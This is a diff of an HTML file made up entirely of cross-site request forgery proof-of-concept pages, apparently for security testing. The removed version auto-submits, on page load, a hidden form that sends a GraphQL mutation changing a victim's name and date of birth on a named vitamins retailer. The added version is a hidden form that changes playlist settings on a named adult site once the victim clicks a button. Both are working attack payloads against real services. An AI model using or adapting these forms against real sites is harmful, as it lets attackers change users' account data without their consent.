@@ -1,20 +1,14 @@
-<!DOCTYPE html>
 <html>
-  <body onload="document.forms[0].submit()">
-    <form action="https://www.myvitamins.com/account/graphql?operationName=UpdatePersonalDetails" method="POST" enctype="text/plain">
-      <input type="hidden" name="query" value='mutation UpdatePersonalDetails($input: [SettingsFieldInput!]!) {
-        updateAccountSettings(input: $input) {
-          error
-          fieldErrors {
-            fieldName
-            validators
-            requiredButNotProvided
-            invalidOption
-          }
-        }
-      }'>
-      <input type="hidden" name="variables" value='{"input":[{"fieldName":"fullName","value":"CSRF Tester"},{"fieldName":"dateOfBirth","value":"01-01-2001"}]}'>
-      <input type="submit" value="Submit CSRF">
+  <body>
+    <h2>Click the button to update your playlist</h2>
+
+    <form action="https://www.mydirtyhobby.com/playlist/update/3832681" method="POST">
+      <input type="hidden" name="up_name" value="Tester" />
+      <input type="hidden" name="up_category" value="34" />
+      <input type="hidden" name="up_show" value="private" />
+      <input type="hidden" name="SubmitForm" value="Save Playlist" />
+      <input type="hidden" name="up_sort_array" value="" />
+      <button type="submit">Update Playlist</button>
     </form>
   </body>
 </html>
